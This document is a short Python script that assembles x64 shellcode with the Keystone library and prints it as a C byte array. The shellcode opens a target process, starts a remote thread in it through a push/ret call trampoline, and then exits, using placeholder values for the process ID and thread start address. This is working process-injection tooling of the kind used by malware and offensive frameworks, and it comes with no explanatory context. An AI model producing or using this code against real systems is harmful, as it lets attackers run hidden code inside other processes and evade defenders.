from keystone import *
import ctypes, struct

CODE = (
    " start: "
        # OpenProcess
        " mov rcx, 0x040A; " #dwDesiredAccess
        " xor rdx, rdx; "
        " mov r8, 0x4141414141414141; " # Process PID
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x38]; "
        " push rbx; "
        " ret; "
        " mov qword ptr [rbp+0xB8], rax; "

        # CreateRemoteThread
        " mov rcx, [rbp+0xB8]; "
        " xor rdx, rdx; "
        " mov r9, 0x4242424242424242 ;"
        " push rdx; "
        " push rdx; "
        " push rdx; "
        " push r9; "
        " push rdx; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x28]; "
        " push rbx; "
        " ret; "
        # ExitProcess
        " xor rcx, rcx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x30]; "
        " push rbx; "
        " ret; "

)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("unsigned char proxy_create_thread[] = (\r\n\"" + instructions + "\");\r\n")